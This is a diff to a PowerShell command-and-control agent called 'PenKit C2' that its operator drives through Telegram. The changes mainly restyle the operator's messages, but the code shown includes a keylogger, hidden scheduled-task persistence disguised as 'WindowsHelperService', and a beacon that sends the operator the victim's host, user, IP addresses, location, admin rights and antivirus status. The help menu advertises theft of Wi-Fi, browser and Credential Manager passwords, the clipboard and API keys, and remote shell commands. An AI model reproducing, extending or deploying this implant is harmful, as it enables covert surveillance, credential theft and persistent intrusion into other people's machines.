@@ -165,26 +165,37 @@ function Handle-Command {
     param([string]$Text, [int]$MsgId)
 
     if ($Text -eq "!help") {
-        $msg = "<b>PenKit C2 Agent</b>`n`n"
-        $msg += "!shell &lt;cmd&gt;    — CMD-Befehl`n"
-        $msg += "!ps &lt;cmd&gt;       — PowerShell`n"
-        $msg += "!screenshot       — Screenshot`n"
-        $msg += "!sysinfo          — Systeminfo`n"
-        $msg += "!whoami           — User + Rechte`n"
-        $msg += "!ls &lt;pfad&gt;       — Verzeichnis`n"
-        $msg += "!cat &lt;datei&gt;     — Datei lesen`n"
-        $msg += "!download &lt;pfad&gt; — Datei senden`n"
-        $msg += "!clipboard        — Zwischenablage`n"
-        $msg += "!keylog start/stop/dump`n"
-        $msg += "!wifi             — WLAN-Passwörter`n"
-        $msg += "!browsers         — Browser-Passwörter (DPAPI)`n"
-        $msg += "!creds            — Credential Manager`n"
-        $msg += "!privesc          — PrivEsc Checks`n"
-        $msg += "!netstat          — Netzwerk-Verbindungen`n"
-        $msg += "!portscan &lt;ip&gt;   — Port-Scan`n"
-        $msg += "!env              — API-Keys in Umgebung`n"
-        $msg += "!persist          — Persistenz`n"
-        $msg += "!exit             — Agent beenden"
+        $msg  = "🎮 <b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>`n"
+        $msg += "    💀 <b>PENKIT C2 — COMMANDS</b>`n"
+        $msg += "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>`n`n"
+        $msg += "🖥️ <b>SHELL</b>`n"
+        $msg += "<code>!shell &lt;cmd&gt;</code>  — CMD-Befehl`n"
+        $msg += "<code>!ps &lt;cmd&gt;</code>     — PowerShell`n`n"
+        $msg += "📸 <b>RECON</b>`n"
+        $msg += "<code>!screenshot</code>   — Screenshot senden`n"
+        $msg += "<code>!sysinfo</code>      — Systeminfo`n"
+        $msg += "<code>!whoami</code>       — User + Rechte`n"
+        $msg += "<code>!netstat</code>      — Netzwerkverbindungen`n"
+        $msg += "<code>!portscan &lt;ip&gt;</code> — Port-Scan vom Ziel`n`n"
+        $msg += "📂 <b>DATEIEN</b>`n"
+        $msg += "<code>!ls &lt;pfad&gt;</code>    — Verzeichnis`n"
+        $msg += "<code>!cat &lt;datei&gt;</code>  — Datei lesen`n"
+        $msg += "<code>!download &lt;pfad&gt;</code> — Datei senden`n`n"
+        $msg += "🔑 <b>CREDENTIALS</b>`n"
+        $msg += "<code>!wifi</code>         — WLAN-Passwörter`n"
+        $msg += "<code>!browsers</code>     — Chrome/Firefox/Edge`n"
+        $msg += "<code>!creds</code>        — Credential Manager`n"
+        $msg += "<code>!clipboard</code>    — Zwischenablage`n"
+        $msg += "<code>!env</code>          — API-Keys in Umgebung`n`n"
+        $msg += "⌨️ <b>KEYLOGGER</b>`n"
+        $msg += "<code>!keylog start</code> — Starten`n"
+        $msg += "<code>!keylog dump</code>  — Log jetzt senden`n"
+        $msg += "<code>!keylog stop</code>  — Stoppen + Log senden`n`n"
+        $msg += "⚠️ <b>ADVANCED</b>`n"
+        $msg += "<code>!privesc</code>      — PrivEsc Checks`n"
+        $msg += "<code>!persist</code>      — Scheduled Task`n"
+        $msg += "<code>!unpersist</code>    — Task entfernen`n"
+        $msg += "<code>!exit</code>         — Agent beenden"
         TG-Send $msg
         return
     }
@@ -216,19 +227,36 @@ function Handle-Command {
     }
 
     if ($Text -eq "!sysinfo") {
-        $ip  = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue)
-        $loc = try { (Invoke-RestMethod "https://ipinfo.io/$ip/json" -ErrorAction SilentlyContinue) } catch { $null }
-        $msg  = "<b>System Info</b>`n"
-        $msg += "Host    : $env:COMPUTERNAME`n"
-        $msg += "User    : $env:USERNAME`n"
-        $msg += "Domain  : $env:USERDOMAIN`n"
-        $msg += "OS      : $((Get-WmiObject Win32_OperatingSystem).Caption)`n"
-        $msg += "IP Ext  : $ip`n"
-        if ($loc) { $msg += "Location: $($loc.city), $($loc.country)`n" }
-        $msg += "IP Int  : $((Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike '127.*'} | Select -First 1).IPAddress)`n"
-        $msg += "RAM     : $([math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)) GB`n"
-        $msg += "AV      : $((Get-MpComputerStatus -ErrorAction SilentlyContinue).AMProductVersion)`n"
-        $msg += "Uptime  : $((Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime)"
+        $extip  = try { Invoke-RestMethod "https://api.ipify.org" -ErrorAction Stop -TimeoutSec 4 } catch { "?" }
+        $loc    = try { $r = Invoke-RestMethod "https://ipinfo.io/$extip/json" -ErrorAction Stop -TimeoutSec 4; "$($r.city), $($r.country) [$($r.org)]" } catch { "?" }
+        $intip  = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object {$_.IPAddress -notlike '127.*'} | Select-Object -First 1).IPAddress
+        $os     = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue)
+        $ram    = "$([math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)) GB"
+        $cpu    = (Get-WmiObject Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).Name
+        $disk   = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" -ErrorAction SilentlyContinue | ForEach-Object { "$($_.DeviceID) $([math]::Round($_.FreeSpace/1GB,1))/$([math]::Round($_.Size/1GB,1))GB" }
+        $uptime = if ($os) { $u = (Get-Date) - $os.ConvertToDateTime($os.LastBootUpTime); "$($u.Days)d $($u.Hours)h $($u.Minutes)m" } else { "?" }
+        $priv   = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { "⚡ ADMIN" } else { "👤 User" }
+        $av     = try { $s = Get-MpComputerStatus -ErrorAction Stop; "WD $($s.AMProductVersion) | RTP: $($s.RealTimeProtectionEnabled)" } catch { "?" }
+        $procs  = (Get-Process -ErrorAction SilentlyContinue).Count
+        $users  = (query user 2>&1) -join ", "
+
+        $msg  = "🖥️ <b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>`n"
+        $msg += "      🎯 <b>SYSTEM INTELLIGENCE</b>`n"
+        $msg += "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>`n`n"
+        $msg += "💻 <b>Host:</b>    <code>$env:COMPUTERNAME</code>`n"
+        $msg += "👤 <b>User:</b>    <code>$env:USERNAME @ $env:USERDOMAIN</code>  $priv`n"
+        $msg += "👥 <b>Sessions:</b> <code>$users</code>`n`n"
+        $msg += "🌐 <b>IP ext:</b>  <code>$extip</code>`n"
+        $msg += "🏠 <b>IP int:</b>  <code>$intip</code>`n"
+        $msg += "🌍 <b>Location:</b> <code>$loc</code>`n`n"
+        $msg += "🖥️ <b>OS:</b>      <code>$($os.Caption) Build $($os.BuildNumber)</code>`n"
+        $msg += "⚙️ <b>CPU:</b>     <code>$cpu</code>`n"
+        $msg += "🧠 <b>RAM:</b>     <code>$ram</code>`n"
+        $msg += "💾 <b>Disks:</b>   <code>$($disk -join ' | ')</code>`n"
+        $msg += "⏱️ <b>Uptime:</b>  <code>$uptime</code>`n"
+        $msg += "🔄 <b>Prozesse:</b> <code>$procs</code>`n`n"
+        $msg += "🛡️ <b>AV:</b>      <code>$av</code>`n"
+        $msg += "⏰ <b>Zeit:</b>    <code>$(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')</code>"
         TG-Send $msg
         return
     }
@@ -285,8 +313,8 @@ function Handle-Command {
                 Add-Type -TypeDefinition $cs -ReferencedAssemblies System.Windows.Forms
                 [KL]::Start($lp)
             } -ArgumentList $KL_CS, $script:KLLog
-            TG-Send "[+] Keylogger gestartet. Log: $script:KLLog"
-        } else { TG-Send "[*] Keylogger läuft bereits." }
+            TG-Send "⌨️ <b>Keylogger gestartet</b>`nLog: <code>$script:KLLog</code>`n`nStoppen: <code>!keylog stop</code>"
+        } else { TG-Send "⌨️ Keylogger läuft bereits." }
         return
     }
 
@@ -503,7 +531,7 @@ function Handle-Command {
         $settings = New-ScheduledTaskSettingsSet -Hidden
         Register-ScheduledTask -TaskName "WindowsHelperService" -Action $action `
             -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
-        TG-Send "[+] Persistiert als Scheduled Task 'WindowsHelperService' (bei Anmeldung)"
+        TG-Send "⚙️ <b>Persistiert!</b>`nTask: <code>WindowsHelperService</code>`nTrigger: Bei Anmeldung`nPfad: <code>$scriptPath</code>"
         return
     }
 
@@ -514,7 +542,7 @@ function Handle-Command {
     }
 
     if ($Text -eq "!exit") {
-        TG-Send "[*] Agent beendet."
+        TG-Send "👋 <b>Agent beendet.</b>`n<code>$env:USERNAME@$env:COMPUTERNAME</code> ist offline."
         exit 0
     }
 }
@@ -528,7 +556,32 @@ $script:KLJob = $null
 $script:KLLog = ""
 $offset = 0
 
-TG-Send "<b>Agent online</b>`n$env:USERNAME@$env:COMPUTERNAME`n$(Get-Date -Format 'dd.MM.yyyy HH:mm')`nTipp: !help"
+$_os   = (Get-WmiObject Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
+$_ram  = "$([math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)) GB"
+$_ip4  = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | Where-Object {$_.IPAddress -notlike '127.*'} | Select-Object -First 1).IPAddress
+$_extip = try { Invoke-RestMethod "https://api.ipify.org" -ErrorAction Stop -TimeoutSec 4 } catch { "?" }
+$_loc   = try { $r = Invoke-RestMethod "https://ipinfo.io/$_extip/json" -ErrorAction Stop -TimeoutSec 4; "$($r.city), $($r.country)" } catch { "?" }
+$_priv  = if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { "⚡ ADMINISTRATOR" } else { "👤 User" }
+$_av    = try { (Get-MpComputerStatus -ErrorAction Stop).AMProductVersion } catch { "?" }
+$_ps    = "$($PSVersionTable.PSVersion.Major).$($PSVersionTable.PSVersion.Minor)"
+
+$_boot = (
+    "⚡ <b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>`n" +
+    "   💀 <b>PENKIT C2 — AGENT ONLINE</b>`n" +
+    "<b>━━━━━━━━━━━━━━━━━━━━━━━━━</b>`n`n" +
+    "💻 <b>Host:</b>     <code>$env:COMPUTERNAME</code>`n" +
+    "👤 <b>User:</b>     <code>$env:USERNAME</code>  $_priv`n" +
+    "🏠 <b>IP int:</b>   <code>$_ip4</code>`n" +
+    "🌐 <b>IP ext:</b>   <code>$_extip</code>`n" +
+    "🌍 <b>Location:</b> <code>$_loc</code>`n" +
+    "🖥️ <b>OS:</b>       <code>$_os</code>`n" +
+    "🧠 <b>RAM:</b>      <code>$_ram</code>`n" +
+    "🛡️ <b>AV:</b>       <code>$_av</code>`n" +
+    "⚙️ <b>PS:</b>       <code>v$_ps</code>`n" +
+    "⏰ <b>Zeit:</b>     <code>$(Get-Date -Format 'dd.MM.yyyy HH:mm:ss')</code>`n`n" +
+    "📋 <code>!help</code> — alle Befehle"
+)
+TG-Send $_boot
 
 # ── Poll loop ──
 while ($true) {
